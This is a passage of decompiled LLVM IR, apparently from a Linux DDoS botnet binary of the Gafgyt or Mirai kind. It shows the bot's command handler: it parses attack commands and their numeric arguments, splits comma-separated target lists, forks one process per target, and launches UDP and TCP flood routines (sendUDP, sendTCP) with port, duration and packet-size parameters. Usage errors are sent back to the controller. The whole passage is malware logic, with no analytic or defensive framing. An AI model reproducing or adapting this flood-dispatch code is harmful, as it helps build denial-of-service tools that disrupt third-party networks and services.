  %v4_804c1c7 = icmp eq i1 %v6_804c1c4, false
  %v5_804c1c7 = and i1 %v4_804c1c7, %v3_804c1c7
  br i1 %v5_804c1c7, label %dec_label_pc_804c1e7, label %dec_label_pc_804c1c9

dec_label_pc_804c1c9:                             ; preds = %dec_label_pc_804c1b0
  %v8_804c1c9 = icmp ult i32 %tmp115, 7
  store i1 %v8_804c1c9, i1* %cf.global-to-local, align 1
  %v12_804c1c9 = icmp eq i32 %tmp115, 7
  %v1_804c1cd = icmp eq i1 %v12_804c1c9, false
  br i1 %v1_804c1cd, label %dec_label_pc_804c202, label %dec_label_pc_804c1cf

dec_label_pc_804c1cf:                             ; preds = %dec_label_pc_804c1c9
  %v1_804c1d2 = add i32 %tmp134, 24
  %v1_804c1d5 = inttoptr i32 %v1_804c1d2 to i32*
  %v2_804c1d5 = load i32, i32* %v1_804c1d5, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c1d5, i32* %stack_var_-300, align 4
  %v1_804c1db = call i32 @atol(i32 %v2_804c1d5)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp156 = icmp slt i32 %v1_804c1db, 1
  %tmp157 = icmp eq i1 %tmp156, false
  br i1 %tmp157, label %dec_label_pc_804c202, label %dec_label_pc_804c1e7

dec_label_pc_804c1e7:                             ; preds = %dec_label_pc_804c100.dec_label_pc_804c1e7_crit_edge, %dec_label_pc_804c1cf, %dec_label_pc_804c1b0, %dec_label_pc_804c195, %dec_label_pc_804c17a, %dec_label_pc_804c161, %dec_label_pc_804c144, %dec_label_pc_804c127, %dec_label_pc_804c10a
  %v0_804c1ec = phi i32 [ %v0_804c1ec.pre, %dec_label_pc_804c100.dec_label_pc_804c1e7_crit_edge ], [ %v15_804bd62, %dec_label_pc_804c1cf ], [ %v15_804bd62, %dec_label_pc_804c1b0 ], [ %v15_804bd62, %dec_label_pc_804c195 ], [ %v15_804bd62, %dec_label_pc_804c17a ], [ %v15_804bd62, %dec_label_pc_804c161 ], [ %v15_804bd62, %dec_label_pc_804c144 ], [ %v15_804bd62, %dec_label_pc_804c127 ], [ %v15_804bd62, %dec_label_pc_804c10a ]
  %v0_804c1e7 = load i32, i32* @global_var_805a160.18, align 32
  %v5_804c1ec = icmp ult i32 %v0_804c1ec, 8
  store i1 %v5_804c1ec, i1* %cf.global-to-local, align 1
  store i32 %v0_804c1e7, i32* %stack_var_-300, align 4
  %v2_804c1f5 = call i32 @Rootsprintf(i32 %v0_804c1e7, i32 ptrtoint ([113 x i8]* @global_var_805652c.159 to i32))
  %v0_804c1fa = load i32, i32* @esp, align 4
  %v2_804c1fa = icmp ugt i32 %v0_804c1fa, -17
  store i1 %v2_804c1fa, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c8cb

dec_label_pc_804c202:                             ; preds = %dec_label_pc_804c1cf, %dec_label_pc_804c1c9
  %v1_804c205 = add i32 %tmp134, 4
  %v1_804c208 = inttoptr i32 %v1_804c205 to i32*
  %v2_804c208 = load i32, i32* %v1_804c208, align 4
  %v2_804c213 = load i32, i32* %v1_804c12d, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c213, i32* %stack_var_-300, align 4
  %v1_804c219 = call i32 @atol(i32 %v2_804c213)
  %v2_804c22a = load i32, i32* %v1_804c110, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c22a, i32* %stack_var_-300, align 4
  %v1_804c230 = call i32 @atol(i32 %v2_804c22a)
  %v2_804c241 = load i32, i32* %v1_804c14a, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c241, i32* %stack_var_-300, align 4
  %v1_804c247 = call i32 @atol(i32 %v2_804c241)
  %v2_804c258 = load i32, i32* %v1_804c167, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c258, i32* %stack_var_-300, align 4
  %v1_804c25e = call i32 @atol(i32 %v2_804c258)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c26d = icmp sgt i32 %tmp115, 6
  br i1 %v7_804c26d, label %dec_label_pc_804c295, label %dec_label_pc_804c295.thread

dec_label_pc_804c295.thread:                      ; preds = %dec_label_pc_804c202
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804c1c9, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c2ca.thread

dec_label_pc_804c295:                             ; preds = %dec_label_pc_804c202
  %v1_804c272 = add i32 %tmp134, 24
  %v1_804c275 = inttoptr i32 %v1_804c272 to i32*
  %v2_804c275 = load i32, i32* %v1_804c275, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c275, i32* %stack_var_-300, align 4
  %v1_804c27b = call i32 @atol(i32 %v2_804c275)
  store i32 %v1_804c27b, i32* @esi, align 4
  store i1 %v8_804c1c9, i1* %cf.global-to-local, align 1
  br i1 %v12_804c1c9, label %dec_label_pc_804c2ca.thread, label %dec_label_pc_804c2ca

dec_label_pc_804c2ca.thread:                      ; preds = %dec_label_pc_804c295, %dec_label_pc_804c295.thread
  %storemerge26164.ph = phi i32 [ 1000, %dec_label_pc_804c295.thread ], [ %v1_804c27b, %dec_label_pc_804c295 ]
  store i32 1000000, i32* @edi, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c2ff

dec_label_pc_804c2ca:                             ; preds = %dec_label_pc_804c295
  %v1_804c2a7 = add i32 %tmp134, 28
  %v1_804c2aa = inttoptr i32 %v1_804c2a7 to i32*
  %v2_804c2aa = load i32, i32* %v1_804c2aa, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c2aa, i32* %stack_var_-300, align 4
  %v1_804c2b0 = call i32 @atol(i32 %v2_804c2aa)
  store i32 %v1_804c2b0, i32* @edi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c2d7 = icmp sgt i32 %tmp115, 8
  br i1 %v7_804c2d7, label %dec_label_pc_804c2d9, label %dec_label_pc_804c2ff

dec_label_pc_804c2d9:                             ; preds = %dec_label_pc_804c2ca
  %v1_804c2dc = add i32 %tmp134, 32
  %v1_804c2df = inttoptr i32 %v1_804c2dc to i32*
  %v2_804c2df = load i32, i32* %v1_804c2df, align 4
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 %v2_804c2df, i32* %stack_var_-300, align 4
  %v1_804c2e5 = call i32 @atol(i32 %v2_804c2df)
  %v0_804c2ea = load i32, i32* @esp, align 4
  %v2_804c2ea = icmp ugt i32 %v0_804c2ea, -17
  store i1 %v2_804c2ea, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c2ff

dec_label_pc_804c2ff:                             ; preds = %dec_label_pc_804c2ca.thread, %dec_label_pc_804c2ca, %dec_label_pc_804c2d9
  %storemerge25169 = phi i32 [ %v1_804c2b0, %dec_label_pc_804c2d9 ], [ %v1_804c2b0, %dec_label_pc_804c2ca ], [ 1000000, %dec_label_pc_804c2ca.thread ]
  %storemerge26164168 = phi i32 [ %v1_804c27b, %dec_label_pc_804c2d9 ], [ %v1_804c27b, %dec_label_pc_804c2ca ], [ %storemerge26164.ph, %dec_label_pc_804c2ca.thread ]
  %storemerge24 = phi i32 [ %v1_804c2e5, %dec_label_pc_804c2d9 ], [ 0, %dec_label_pc_804c2ca ], [ 0, %dec_label_pc_804c2ca.thread ]
  %v5_804c30b = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804c30b, i1* %cf.global-to-local, align 1
  store i32 %v2_804c208, i32* %stack_var_-300, align 4
  %v2_804c311 = inttoptr i32 %v2_804c208 to i8*
  %v3_804c311 = call i32 @__GI_strchr(i8* %v2_804c311, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c319 = icmp eq i32 %v3_804c311, 0
  br i1 %v1_804c319, label %dec_label_pc_804c389, label %dec_label_pc_804c31d

dec_label_pc_804c31d:                             ; preds = %dec_label_pc_804c2ff
  store i32 %v2_804c208, i32* @eax, align 4
  store i1 %v5_804c30b, i1* %cf.global-to-local, align 1
  store i32 %v2_804c208, i32* %stack_var_-300, align 4
  %v2_804c329 = call i32 @__GI_strtok(i32 %v2_804c208, i32 ptrtoint (i32* @global_var_80564b1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c37e186 = icmp eq i32 %v2_804c329, 0
  %v1_804c382187 = icmp eq i1 %v4_804c37e186, false
  br i1 %v1_804c382187, label %dec_label_pc_804c336, label %dec_label_pc_804c8cb

dec_label_pc_804c336:                             ; preds = %dec_label_pc_804c31d, %dec_label_pc_804c369
  %storemerge69188 = phi i32 [ %v2_804c373, %dec_label_pc_804c369 ], [ %v2_804c329, %dec_label_pc_804c31d ]
  %v0_804c336 = call i32 @listFork()
  store i32 %v0_804c336, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c33b = icmp eq i32 %v0_804c336, 0
  %v1_804c33d = icmp eq i1 %v1_804c33b, false
  br i1 %v1_804c33d, label %dec_label_pc_804c369, label %dec_label_pc_804c33f

dec_label_pc_804c33f:                             ; preds = %dec_label_pc_804c336
  store i32 %v1_804c25e, i32* %stack_var_-300, align 4
  %v8_804c357 = call i32 @sendUDP(i32 %storemerge69188, i32 %v1_804c219, i32 %v1_804c230, i32 %v1_804c247, i32 %v1_804c25e, i32 %storemerge26164168, i32 %storemerge25169, i32 %storemerge24)
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804c364 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c369:                             ; preds = %dec_label_pc_804c336
  %v0_804c369 = load i32, i32* @esp, align 4
  %v5_804c369 = icmp ult i32 %v0_804c369, 8
  store i1 %v5_804c369, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v2_804c373 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80564b1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c37e = icmp eq i32 %v2_804c373, 0
  %v1_804c382 = icmp eq i1 %v4_804c37e, false
  br i1 %v1_804c382, label %dec_label_pc_804c336, label %dec_label_pc_804c8cb

dec_label_pc_804c389:                             ; preds = %dec_label_pc_804c2ff
  %v0_804c389 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c38e = icmp eq i32 %v0_804c389, 0
  %v1_804c390 = icmp eq i1 %v1_804c38e, false
  br i1 %v1_804c390, label %dec_label_pc_804c8cb, label %dec_label_pc_804c396

dec_label_pc_804c396:                             ; preds = %dec_label_pc_804c389
  store i32 %v1_804c25e, i32* %stack_var_-300, align 4
  %v8_804c3ae = call i32 @sendUDP(i32 %v2_804c208, i32 %v1_804c219, i32 %v1_804c230, i32 %v1_804c247, i32 %v1_804c25e, i32 %storemerge26164168, i32 %storemerge25169, i32 %storemerge24)
  store i1 %v5_804c12f, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804c3bb = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c3c0:                             ; preds = %dec_label_pc_804c0b5
  %v2_804c3c3 = load i32, i32* %v1_804bd6b, align 4
  store i1 false, i1* @df, align 1
  %v4_804c3e0 = inttoptr i32 %v2_804c3c3 to i8*
  store i32 %v2_804c3c3, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805659d.160 to i32), i32* @edi, align 4
  %v7_804c3f2 = call i32 @_strncmp(i8* %v4_804c3e0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805659d.160, i32 0, i32 0), i32 4)
  %v8_804c3f2 = urem i32 %v7_804c3f2, 2
  %v9_804c3f2 = icmp eq i32 %v8_804c3f2, 0
  %v0_804c3f4 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c3f4 = or i1 %v0_804c3f4, %v9_804c3f2
  %v3_804c3f4 = zext i1 %v2_804c3f4 to i32
  %v4_804c3f4 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c3f4 = and i32 %v4_804c3f4, -256
  %v6_804c3f4 = or i32 %v3_804c3f4, %v5_804c3f4
  %v7_804c3f4 = xor i32 %v6_804c3f4, 1
  store i32 %v7_804c3f4, i32* @edx, align 4
  %v1_804c3fc = trunc i32 %v7_804c3f4 to i8
  %v3_804c3fc = zext i1 %v0_804c3f4 to i8
  %v15_804c3fc = icmp eq i8 %v1_804c3fc, %v3_804c3fc
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c405 = icmp eq i1 %v15_804c3fc, false
  br i1 %v1_804c405, label %dec_label_pc_804c64a, label %dec_label_pc_804c40b

dec_label_pc_804c40b:                             ; preds = %dec_label_pc_804c3c0
  %v9_804c40b = icmp ult i32 %tmp115, 5
  store i1 %v9_804c40b, i1* %cf.global-to-local, align 1
  %v7_804c40f = icmp sgt i32 %tmp115, 5
  br i1 %v7_804c40f, label %dec_label_pc_804c415, label %dec_label_pc_804c40b.dec_label_pc_804c4b9_crit_edge

dec_label_pc_804c40b.dec_label_pc_804c4b9_crit_edge: ; preds = %dec_label_pc_804c40b
  %v0_804c4be.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c4b9

dec_label_pc_804c415:                             ; preds = %dec_label_pc_804c40b
  %v1_804c418 = add i32 %tmp134, 12
  %v1_804c41b = inttoptr i32 %v1_804c418 to i32*
  %v2_804c41b = load i32, i32* %v1_804c41b, align 4
  %v0_804c41d = load i32, i32* @esp, align 4
  %v5_804c41d = icmp ult i32 %v0_804c41d, 12
  store i1 %v5_804c41d, i1* %cf.global-to-local, align 1
  store i32 %v2_804c41b, i32* %stack_var_-300, align 4
  %v1_804c421 = call i32 @atol(i32 %v2_804c41b)
  %v5_804c429 = icmp ne i32 %v1_804c421, -1
  store i1 %v5_804c429, i1* %cf.global-to-local, align 1
  %v10_804c429 = icmp eq i32 %v1_804c421, -1
  br i1 %v10_804c429, label %dec_label_pc_804c4b9, label %dec_label_pc_804c432

dec_label_pc_804c432:                             ; preds = %dec_label_pc_804c415
  %v1_804c435 = add i32 %tmp134, 8
  %v1_804c438 = inttoptr i32 %v1_804c435 to i32*
  %v2_804c438 = load i32, i32* %v1_804c438, align 4
  %v5_804c43a = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c438, i32* %stack_var_-300, align 4
  %v1_804c43e = call i32 @atol(i32 %v2_804c438)
  %v5_804c446 = icmp ne i32 %v1_804c43e, -1
  store i1 %v5_804c446, i1* %cf.global-to-local, align 1
  %v10_804c446 = icmp eq i32 %v1_804c43e, -1
  br i1 %v10_804c446, label %dec_label_pc_804c4b9, label %dec_label_pc_804c44b

dec_label_pc_804c44b:                             ; preds = %dec_label_pc_804c432
  %v1_804c44e = add i32 %tmp134, 16
  %v1_804c451 = inttoptr i32 %v1_804c44e to i32*
  %v2_804c451 = load i32, i32* %v1_804c451, align 4
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c451, i32* %stack_var_-300, align 4
  %v1_804c457 = call i32 @atol(i32 %v2_804c451)
  %v5_804c45f = icmp ne i32 %v1_804c457, -1
  store i1 %v5_804c45f, i1* %cf.global-to-local, align 1
  %v10_804c45f = icmp eq i32 %v1_804c457, -1
  br i1 %v10_804c45f, label %dec_label_pc_804c4b9, label %dec_label_pc_804c464

dec_label_pc_804c464:                             ; preds = %dec_label_pc_804c44b
  %v2_804c46a = load i32, i32* %v1_804c451, align 4
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c46a, i32* %stack_var_-300, align 4
  %v1_804c470 = call i32 @atol(i32 %v2_804c46a)
  %v1_804c478 = add i32 %v1_804c470, -32
  %v2_804c478 = icmp ult i32 %v1_804c470, 32
  %v3_804c478 = sub i32 31, %v1_804c470
  %v4_804c478 = and i32 %v3_804c478, %v1_804c470
  %v5_804c478 = icmp slt i32 %v4_804c478, 0
  store i1 %v2_804c478, i1* %cf.global-to-local, align 1
  %v6_804c478 = icmp eq i32 %v1_804c478, 0
  %v7_804c478 = icmp slt i32 %v1_804c478, 0
  %v3_804c47b = icmp eq i1 %v7_804c478, %v5_804c478
  %v4_804c47b = icmp eq i1 %v6_804c478, false
  %v5_804c47b = and i1 %v4_804c47b, %v3_804c47b
  br i1 %v5_804c47b, label %dec_label_pc_804c4b9, label %dec_label_pc_804c47d

dec_label_pc_804c47d:                             ; preds = %dec_label_pc_804c464
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c481 = icmp sgt i32 %tmp115, 6
  br i1 %v7_804c481, label %dec_label_pc_804c483, label %dec_label_pc_804c49b.thread

dec_label_pc_804c49b.thread:                      ; preds = %dec_label_pc_804c47d
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c4d4

dec_label_pc_804c483:                             ; preds = %dec_label_pc_804c47d
  %v1_804c486 = add i32 %tmp134, 24
  %v1_804c489 = inttoptr i32 %v1_804c486 to i32*
  %v2_804c489 = load i32, i32* %v1_804c489, align 4
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c489, i32* %stack_var_-300, align 4
  %v1_804c48f = call i32 @atol(i32 %v2_804c489)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804c497 = icmp slt i32 %v1_804c48f, 0
  br i1 %v2_804c497, label %dec_label_pc_804c4b9, label %dec_label_pc_804c49b

dec_label_pc_804c49b:                             ; preds = %dec_label_pc_804c483
  %v8_804c49b = icmp ult i32 %tmp115, 8
  store i1 %v8_804c49b, i1* %cf.global-to-local, align 1
  %v12_804c49b = icmp eq i32 %tmp115, 8
  %v1_804c49f = icmp eq i1 %v12_804c49b, false
  br i1 %v1_804c49f, label %dec_label_pc_804c4d4, label %dec_label_pc_804c4a1

dec_label_pc_804c4a1:                             ; preds = %dec_label_pc_804c49b
  %v1_804c4a4 = add i32 %tmp134, 28
  %v1_804c4a7 = inttoptr i32 %v1_804c4a4 to i32*
  %v2_804c4a7 = load i32, i32* %v1_804c4a7, align 4
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c4a7, i32* %stack_var_-300, align 4
  %v1_804c4ad = call i32 @atol(i32 %v2_804c4a7)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp158 = icmp slt i32 %v1_804c4ad, 1
  %tmp159 = icmp eq i1 %tmp158, false
  br i1 %tmp159, label %dec_label_pc_804c4d4, label %dec_label_pc_804c4b9

dec_label_pc_804c4b9:                             ; preds = %dec_label_pc_804c40b.dec_label_pc_804c4b9_crit_edge, %dec_label_pc_804c4a1, %dec_label_pc_804c483, %dec_label_pc_804c464, %dec_label_pc_804c44b, %dec_label_pc_804c432, %dec_label_pc_804c415
  %v0_804c4be = phi i32 [ %v0_804c4be.pre, %dec_label_pc_804c40b.dec_label_pc_804c4b9_crit_edge ], [ %v15_804bd62, %dec_label_pc_804c4a1 ], [ %v15_804bd62, %dec_label_pc_804c483 ], [ %v15_804bd62, %dec_label_pc_804c464 ], [ %v15_804bd62, %dec_label_pc_804c44b ], [ %v15_804bd62, %dec_label_pc_804c432 ], [ %v15_804bd62, %dec_label_pc_804c415 ]
  %v0_804c4b9 = load i32, i32* @global_var_805a160.18, align 32
  %v5_804c4be = icmp ult i32 %v0_804c4be, 8
  store i1 %v5_804c4be, i1* %cf.global-to-local, align 1
  store i32 %v0_804c4b9, i32* %stack_var_-300, align 4
  %v2_804c4c7 = call i32 @Rootsprintf(i32 %v0_804c4b9, i32 ptrtoint ([186 x i8]* @global_var_80565a4.161 to i32))
  %v0_804c4cc = load i32, i32* @esp, align 4
  %v2_804c4cc = icmp ugt i32 %v0_804c4cc, -17
  store i1 %v2_804c4cc, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c8cb

dec_label_pc_804c4d4:                             ; preds = %dec_label_pc_804c49b.thread, %dec_label_pc_804c4a1, %dec_label_pc_804c49b
  %v8_804c49b173 = phi i1 [ true, %dec_label_pc_804c49b.thread ], [ %v8_804c49b, %dec_label_pc_804c4a1 ], [ %v8_804c49b, %dec_label_pc_804c49b ]
  %v1_804c49f175 = phi i1 [ true, %dec_label_pc_804c49b.thread ], [ false, %dec_label_pc_804c4a1 ], [ true, %dec_label_pc_804c49b ]
  %v1_804c4d7 = add i32 %tmp134, 4
  %v1_804c4da = inttoptr i32 %v1_804c4d7 to i32*
  %v2_804c4da = load i32, i32* %v1_804c4da, align 4
  %v2_804c4e5 = load i32, i32* %v1_804c438, align 4
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c4e5, i32* %stack_var_-300, align 4
  %v1_804c4eb = call i32 @atol(i32 %v2_804c4e5)
  %v2_804c4fc = load i32, i32* %v1_804c41b, align 4
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c4fc, i32* %stack_var_-300, align 4
  %v1_804c502 = call i32 @atol(i32 %v2_804c4fc)
  %v2_804c513 = load i32, i32* %v1_804c451, align 4
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c513, i32* %stack_var_-300, align 4
  %v1_804c519 = call i32 @atol(i32 %v2_804c513)
  %v1_804c527 = add i32 %tmp134, 20
  %v1_804c52a = inttoptr i32 %v1_804c527 to i32*
  %v2_804c52a = load i32, i32* %v1_804c52a, align 4
  store i1 %v8_804c49b173, i1* %cf.global-to-local, align 1
  br i1 %v1_804c49f175, label %dec_label_pc_804c55b, label %dec_label_pc_804c535

dec_label_pc_804c535:                             ; preds = %dec_label_pc_804c4d4
  %v1_804c538 = add i32 %tmp134, 28
  %v1_804c53b = inttoptr i32 %v1_804c538 to i32*
  %v2_804c53b = load i32, i32* %v1_804c53b, align 4
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c53b, i32* %stack_var_-300, align 4
  %v1_804c541 = call i32 @atol(i32 %v2_804c53b)
  %v0_804c546 = load i32, i32* @esp, align 4
  %v2_804c546 = icmp ugt i32 %v0_804c546, -17
  store i1 %v2_804c546, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c55b

dec_label_pc_804c55b:                             ; preds = %dec_label_pc_804c4d4, %dec_label_pc_804c535
  %storemerge23 = phi i32 [ %v1_804c541, %dec_label_pc_804c535 ], [ 10, %dec_label_pc_804c4d4 ]
  store i32 %storemerge23, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804c481, label %dec_label_pc_804c56a, label %dec_label_pc_804c590

dec_label_pc_804c56a:                             ; preds = %dec_label_pc_804c55b
  %v1_804c56d = add i32 %tmp134, 24
  %v1_804c570 = inttoptr i32 %v1_804c56d to i32*
  %v2_804c570 = load i32, i32* %v1_804c570, align 4
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c570, i32* %stack_var_-300, align 4
  %v1_804c576 = call i32 @atol(i32 %v2_804c570)
  %v0_804c57b = load i32, i32* @esp, align 4
  %v2_804c57b = icmp ugt i32 %v0_804c57b, -17
  store i1 %v2_804c57b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c590

dec_label_pc_804c590:                             ; preds = %dec_label_pc_804c55b, %dec_label_pc_804c56a
  %storemerge22 = phi i32 [ %v1_804c576, %dec_label_pc_804c56a ], [ 0, %dec_label_pc_804c55b ]
  store i32 %storemerge22, i32* @edi, align 4
  %v5_804c59c = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804c59c, i1* %cf.global-to-local, align 1
  store i32 %v2_804c4da, i32* %stack_var_-300, align 4
  %v2_804c5a2 = inttoptr i32 %v2_804c4da to i8*
  %v3_804c5a2 = call i32 @__GI_strchr(i8* %v2_804c5a2, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c5aa = icmp eq i32 %v3_804c5a2, 0
  br i1 %v1_804c5aa, label %dec_label_pc_804c617, label %dec_label_pc_804c5ae

dec_label_pc_804c5ae:                             ; preds = %dec_label_pc_804c590
  store i32 %v2_804c4da, i32* @eax, align 4
  store i1 %v5_804c59c, i1* %cf.global-to-local, align 1
  store i32 %v2_804c4da, i32* %stack_var_-300, align 4
  %v2_804c5ba = call i32 @__GI_strtok(i32 %v2_804c4da, i32 ptrtoint (i32* @global_var_80564b1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c60f183 = icmp eq i32 %v2_804c5ba, 0
  %v1_804c613184 = icmp eq i1 %v4_804c60f183, false
  br i1 %v1_804c613184, label %dec_label_pc_804c5c7, label %dec_label_pc_804c64a

dec_label_pc_804c5c7:                             ; preds = %dec_label_pc_804c5ae, %dec_label_pc_804c5fa
  %storemerge70185 = phi i32 [ %v2_804c604, %dec_label_pc_804c5fa ], [ %v2_804c5ba, %dec_label_pc_804c5ae ]
  %v0_804c5c7 = call i32 @listFork()
  store i32 %v0_804c5c7, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c5cc = icmp eq i32 %v0_804c5c7, 0
  %v1_804c5ce = icmp eq i1 %v1_804c5cc, false
  %v0_804c5fa = load i32, i32* @esp, align 4
  br i1 %v1_804c5ce, label %dec_label_pc_804c5fa, label %dec_label_pc_804c5d0

dec_label_pc_804c5d0:                             ; preds = %dec_label_pc_804c5c7
  %v5_804c5d0 = icmp ult i32 %v0_804c5fa, 4
  store i1 %v5_804c5d0, i1* %cf.global-to-local, align 1
  store i32 %v2_804c52a, i32* %stack_var_-300, align 4
  %v7_804c5e8 = inttoptr i32 %v2_804c52a to i8*
  %v8_804c5e8 = call i32 @sendTCP(i32 %storemerge70185, i32 %v1_804c4eb, i32 %v1_804c502, i32 %v1_804c519, i8* %v7_804c5e8, i32 %storemerge22, i32 %storemerge23)
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804c5f5 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c5fa:                             ; preds = %dec_label_pc_804c5c7
  %v5_804c5fa = icmp ult i32 %v0_804c5fa, 8
  store i1 %v5_804c5fa, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v2_804c604 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80564b1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c60f = icmp eq i32 %v2_804c604, 0
  %v1_804c613 = icmp eq i1 %v4_804c60f, false
  br i1 %v1_804c613, label %dec_label_pc_804c5c7, label %dec_label_pc_804c64a

dec_label_pc_804c617:                             ; preds = %dec_label_pc_804c590
  %v0_804c617 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c61c = icmp eq i32 %v0_804c617, 0
  %v1_804c61e = icmp eq i1 %v1_804c61c, false
  br i1 %v1_804c61e, label %dec_label_pc_804c64a, label %dec_label_pc_804c620

dec_label_pc_804c620:                             ; preds = %dec_label_pc_804c617
  %v0_804c620 = load i32, i32* @esp, align 4
  %v5_804c620 = icmp ult i32 %v0_804c620, 4
  store i1 %v5_804c620, i1* %cf.global-to-local, align 1
  store i32 %v2_804c52a, i32* %stack_var_-300, align 4
  %v7_804c638 = inttoptr i32 %v2_804c52a to i8*
  %v8_804c638 = call i32 @sendTCP(i32 %v2_804c4da, i32 %v1_804c4eb, i32 %v1_804c502, i32 %v1_804c519, i8* %v7_804c638, i32 %storemerge22, i32 %storemerge23)
  store i1 %v5_804c43a, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804c645 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c64a:                             ; preds = %dec_label_pc_804c5ae, %dec_label_pc_804c5fa, %dec_label_pc_804c3c0, %dec_label_pc_804c617
  %v2_804c64d = load i32, i32* %v1_804bd6b, align 4
  store i1 false, i1* @df, align 1
  %v4_804c66a = inttoptr i32 %v2_804c64d to i8*
  store i32 %v2_804c64d, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805665e.162 to i32), i32* @edi, align 4
  %v7_804c67c = call i32 @_strncmp(i8* %v4_804c66a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805665e.162, i32 0, i32 0), i32 4)
  %v8_804c67c = urem i32 %v7_804c67c, 2
  %v9_804c67c = icmp eq i32 %v8_804c67c, 0
  %v0_804c67e = load i1, i1* %cf.global-to-local, align 1
  %v2_804c67e = or i1 %v0_804c67e, %v9_804c67c
  %v3_804c67e = zext i1 %v2_804c67e to i32
  %v4_804c67e = load i32, i32* @edx, align 4
  %v5_804c67e = and i32 %v4_804c67e, -256
  %v6_804c67e = or i32 %v3_804c67e, %v5_804c67e
  %v7_804c67e = xor i32 %v6_804c67e, 1
  store i32 %v7_804c67e, i32* @edx, align 4
  %v1_804c686 = trunc i32 %v7_804c67e to i8
  %v3_804c686 = zext i1 %v0_804c67e to i8
  %v15_804c686 = icmp eq i8 %v1_804c686, %v3_804c686
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c68f = icmp eq i1 %v15_804c686, false
  br i1 %v1_804c68f, label %dec_label_pc_804c7bc, label %dec_label_pc_804c695

dec_label_pc_804c695:                             ; preds = %dec_label_pc_804c64a
  %v9_804c695 = icmp ult i32 %tmp115, 3
  store i1 %v9_804c695, i1* %cf.global-to-local, align 1
  %v7_804c699 = icmp sgt i32 %tmp115, 3
  br i1 %v7_804c699, label %dec_label_pc_804c69b, label %dec_label_pc_804c695.dec_label_pc_804c6cb_crit_edge

